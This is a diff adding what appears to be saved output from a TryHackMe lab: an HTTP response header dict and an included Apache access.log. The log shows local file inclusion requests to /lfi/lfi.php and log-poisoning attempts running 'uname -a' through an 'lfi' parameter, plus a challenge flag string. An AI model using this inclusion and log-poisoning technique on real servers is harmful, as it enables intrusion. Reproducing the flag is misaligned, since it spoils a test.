@@ -1,0 +1,17 @@
+{'Date': 'Mon, 20 Jul 2020 09:42:25 GMT', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '407', 'Keep-Alive': 'timeout=5, max=99', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+--------------------
+File included: /var/log/apache2/access.log<br><br><br>Local file to be used: /var/log/apache2/access.log<br><br>10.8.29.246 - - [20/Jul/2020:02:29:45 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 338 "-" "Mozilla/5.0 THM{a352a5c2acfd22251c3a94105b718fea}
+ Firefox/70.0"
+10.8.29.246 - - [20/Jul/2020:02:31:28 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 441 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
+10.8.29.246 - - [20/Jul/2020:02:31:29 -0700] "GET /favicon.ico HTTP/1.1" 404 490 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
+10.8.29.246 - - [20/Jul/2020:02:32:11 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-a HTTP/1.1" 200 592 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
+10.8.29.246 - - [20/Jul/2020:02:33:41 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r HTTP/1.1" 200 564 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
+10.8.29.246 - - [20/Jul/2020:02:35:07 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 564 "-" "Mozilla/5.0 THM{a352a5c2acfd22251c3a94105b718fea}
+ Firefox/70.0"
+10.8.29.246 - - [20/Jul/2020:02:35:46 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-a HTTP/1.1" 200 645 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
+10.8.29.246 - - [20/Jul/2020:02:40:32 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 589 "-" "Mozilla/5.0 THM{a352a5c2acfd22251c3a94105b718fea}
+ Firefox/70.0"
+10.8.29.246 - - [20/Jul/2020:02:40:32 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-a HTTP/1.1" 200 657 "-" "python-requests/2.21.0"
+
+
+
